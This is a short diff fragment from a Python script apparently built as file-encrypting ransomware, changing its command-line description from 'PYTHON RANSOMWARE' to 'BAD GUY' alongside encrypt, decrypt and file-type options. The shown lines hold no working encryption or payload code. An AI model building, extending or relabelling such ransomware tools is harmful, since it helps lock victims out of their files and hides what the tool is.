@@ -42,7 +42,7 @@ def decrypt(filename, key):
         file.write(decrypted)
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="PYTHON RANSOMWARE")
+    parser = argparse.ArgumentParser(description="BAD GUY")
     parser.add_argument("-e", "--encrypt", action="store_true")
     parser.add_argument("-d", "--decrypt", action="store_true")
     parser.add_argument("-f", "--filetype", type=str, help="Specify the file type")
